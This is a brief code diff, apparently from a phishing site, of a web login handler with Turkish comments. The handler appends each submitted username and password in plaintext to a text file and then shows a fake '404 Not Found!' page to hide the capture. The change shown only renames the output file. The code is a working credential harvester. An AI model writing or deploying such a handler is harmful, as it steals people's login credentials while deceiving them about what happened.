@@ -25,7 +25,7 @@ def login():
     username = request.form.get('username')
     password = request.form.get('password')
     # Kullanıcı giriş bilgilerini dosyaya kaydeder
-    with open('rockman.txt', 'a') as file:
+    with open('info.txt', 'a') as file:
         file.write(f'Kullanıcı Adı: {username}, Şifre: {password}\n')
     return '404 Not Found!'
 
